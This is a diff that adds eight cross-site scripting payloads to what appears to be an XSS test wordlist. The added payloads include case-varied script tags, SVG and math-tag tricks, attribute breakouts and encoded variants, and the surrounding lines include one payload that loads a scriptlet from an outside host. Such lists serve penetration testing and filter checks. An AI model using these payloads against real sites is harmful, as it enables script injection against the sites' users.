@@ -30,3 +30,11 @@ javascript:alert(1)
 <div style="width:expression(alert(1))">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
 \x3Cscript\x3Ealert(1)\x3C/script\x3E
+<ScRiPt>alert(1)</ScRiPt>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<math><mtext></mtext><script>alert(1)</script></math>
+\"><img src=x onerror=alert(document.domain)>
+'><svg onload=alert(document.domain)>
+%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+javascript:alert(document.domain)
